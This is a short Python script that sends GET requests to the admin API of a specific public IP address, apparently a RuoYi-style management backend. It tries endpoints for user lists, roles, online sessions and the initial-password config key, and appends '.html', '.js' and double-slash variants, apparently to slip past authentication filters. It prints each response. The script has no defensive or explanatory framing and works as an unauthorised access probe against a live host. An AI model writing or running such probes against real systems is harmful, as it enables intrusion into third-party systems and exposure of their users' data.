import urllib.request, json, time
base="http://144.123.22.234:9080/prod-api"
tests=[("GET","/auth/unlock/test",None),("GET","/auth/binding/gitee?tenantId=000000&domain=144.123.22.234",None),
("GET","/system/social/list",None),("GET","/system/social/list.html",None),
("GET","/qmd/black/single/black/num?num=13800000000",None),
("GET","/system/dict/data/type/sys_user_sex.html",None),
("GET","/system/dict/data/type/sys_normal_disable.html",None),
("GET","/system/config/configKey/sys.user.initPassword.html",None),
("GET","/system/config/configKey/sys.index.skinName.html",None),
("GET","/system/config/configKey/sys.account.captchaEnabled.html",None),
("GET","/system/user/list/.html",None),
("GET","/system/user/list/.js",None),
("GET","//system/user/list.html",None),
("GET","/system/user/list.html?pageNum=1&pageSize=10",None),
("GET","/system/user/1.html",None),
("GET","/system/role/1.html",None),
("GET","/monitor/online/1.html",None),
("GET","/system/notice/1.html",None),
("GET","/system/dict/type/1.html",None)]
for m,p,_ in tests:
    url=base+p
    req=urllib.request.Request(url,method=m,headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'})
    try:
        with urllib.request.urlopen(req,timeout=15) as r: st=r.status; b=r.read(1200).decode('utf-8','replace')
    except urllib.error.HTTPError as e: st=e.code; b=e.read(1200).decode('utf-8','replace')
    except Exception as e: st=-1; b='ERR '+str(e)
    print(f"{m} {p} -> http{st} {b[:220]}")
    time.sleep(0.4)
